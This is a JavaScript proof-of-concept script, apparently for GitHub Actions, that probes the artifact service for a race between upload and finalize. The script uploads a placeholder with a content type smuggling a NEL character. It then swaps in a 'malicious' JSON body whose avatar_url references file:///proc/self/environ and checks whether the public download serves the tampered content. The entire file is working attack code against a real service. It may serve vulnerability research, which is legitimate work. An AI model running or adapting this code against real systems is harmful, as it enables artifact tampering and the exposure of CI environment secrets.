import https from 'node:https';
import {createHash} from 'node:crypto';

import {BlobClient} from '@azure/storage-blob';
import {internalArtifactTwirpClient} from '../node_modules/@actions/artifact/lib/internal/shared/artifact-twirp-client.js';
import {getBackendIdsFromToken} from '../node_modules/@actions/artifact/lib/internal/shared/util.js';
import {StringValue} from '../node_modules/@actions/artifact/lib/generated/index.js';

const ids = getBackendIdsFromToken();
const client = internalArtifactTwirpClient({maxAttempts: 1});
const name = `pending-bounded-${process.env.GITHUB_RUN_ID}.json`;
const repository = process.env.GITHUB_REPOSITORY;
const nelType = 'application/json\u0085';
const placeholder = Buffer.from('{"probe":"pending"}');
let stage = 'start';

const digest = bytes => createHash('sha256').update(bytes).digest('hex');
const pause = ms => new Promise(resolve => setTimeout(resolve, ms));

function maliciousBody(artifactId) {
  const route = `${repository}/actions/artifacts/${artifactId}/zip`;
  return Buffer.from(JSON.stringify({
    full_name: route,
    owner: {login: 'cassette', avatar_url: 'file:///proc/self/environ'},
    description: 'Bounded pending artifact probe',
  }));
}

function request(url, headers = {}) {
  return new Promise((resolve, reject) => {
    const call = https.get(url, {headers}, response => {
      const chunks = [];
      response.on('data', chunk => chunks.push(chunk));
      response.on('end', () => resolve({
        status: response.statusCode,
        headers: response.headers,
        rawHeaders: response.rawHeaders,
        body: Buffer.concat(chunks),
      }));
    });
    call.setTimeout(12000, () => call.destroy(new Error('timeout')));
    call.on('error', reject);
  });
}

function typeHex(response) {
  for (let index = 0; index < response.rawHeaders.length; index += 2) {
    if (response.rawHeaders[index].toLowerCase() === 'content-type') {
      return Buffer.from(response.rawHeaders[index + 1], 'latin1').toString('hex');
    }
  }
  return null;
}

async function publicProbe(artifactId, body, phase, attempt) {
  const first = await request(
    `https://api.github.com/repos/${repository}/actions/artifacts/${artifactId}/zip`,
    {
      accept: 'application/vnd.github.v3+json',
      authorization: `Bearer ${process.env.GITHUB_TOKEN}`,
      'user-agent': 'repo-cassette-pending-bounded',
    },
  );
  const location = first.headers.location;
  const report = {phase, attempt, publicStatus: first.status, hasLocation: Boolean(location)};
  if (location) {
    const signed = new URL(location);
    const rsct = signed.searchParams.get('rsct');
    report.rsctHex = rsct === null ? null : Buffer.from(rsct, 'latin1').toString('hex');
    report.hasApiVersion = signed.searchParams.has('api-version');
    const final = await request(signed);
    report.finalStatus = final.status;
    report.finalTypeHex = typeHex(final);
    report.bodyLength = final.body.length;
    report.bodySha256 = digest(final.body);
    report.bodyMatch = final.body.equals(body);
  }
  console.log('PENDING-BOUNDED', JSON.stringify(report));
  return first.status;
}

try {
  stage = 'create';
  const created = await client.CreateArtifact({
    workflowRunBackendId: ids.workflowRunBackendId,
    workflowJobRunBackendId: ids.workflowJobRunBackendId,
    name,
    version: 7,
    mimeType: StringValue.create({value: 'application/json'}),
  });
  if (!created.ok || !created.signedUploadUrl) throw new Error('create-failed');
  const blob = new BlobClient(created.signedUploadUrl).getBlockBlobClient();

  stage = 'upload-placeholder';
  await blob.uploadData(placeholder, {blobHTTPHeaders: {blobContentType: nelType}});

  stage = 'list-before-finalize';
  let pendingId = null;
  for (let attempt = 0; attempt < 12 && !pendingId; attempt++) {
    const listed = await client.ListArtifacts({
      workflowRunBackendId: ids.workflowRunBackendId,
      workflowJobRunBackendId: ids.workflowJobRunBackendId,
      nameFilter: StringValue.create({value: name}),
    });
    const item = listed.artifacts.find(artifact => artifact.name === name);
    pendingId = item?.databaseId ?? null;
    if (!pendingId) await pause(300);
  }
  console.log('PENDING-LIST', JSON.stringify({visibleBeforeFinalize: Boolean(pendingId)}));

  let body = placeholder;
  if (pendingId) {
    stage = 'upload-malicious-before-finalize';
    body = maliciousBody(pendingId);
    await blob.uploadData(body, {blobHTTPHeaders: {blobContentType: nelType}});
    stage = 'public-before-finalize';
    for (let attempt = 0; attempt < 3; attempt++) {
      const status = await publicProbe(pendingId, body, 'before-finalize', attempt);
      if (status !== 404) break;
      await pause(350);
    }
  }

  stage = 'finalize';
  const finalized = await client.FinalizeArtifact({
    workflowRunBackendId: ids.workflowRunBackendId,
    workflowJobRunBackendId: ids.workflowJobRunBackendId,
    name,
    size: String(body.length),
    hash: StringValue.create({value: `sha256:${digest(body)}`}),
  });
  const finalId = finalized.artifactId;
  if (!finalized.ok || !finalId) throw new Error('finalize-failed');
  console.log('PENDING-FINALIZE', JSON.stringify({hadPendingId: Boolean(pendingId), idsEqual: pendingId ? String(pendingId) === String(finalId) : null}));

  if (!pendingId || String(pendingId) !== String(finalId)) {
    stage = 'upload-malicious-after-finalize';
    body = maliciousBody(finalId);
    await blob.uploadData(body, {blobHTTPHeaders: {blobContentType: nelType}});
  }
  stage = 'public-after-finalize';
  for (let attempt = 0; attempt < 3; attempt++) {
    const status = await publicProbe(finalId, body, 'after-finalize', attempt);
    if (status !== 404) break;
    await pause(350);
  }
} catch (error) {
  console.log('PENDING-ERROR', JSON.stringify({stage, name: error?.name || 'Error', code: error?.code || null}));
  process.exitCode = 1;
}
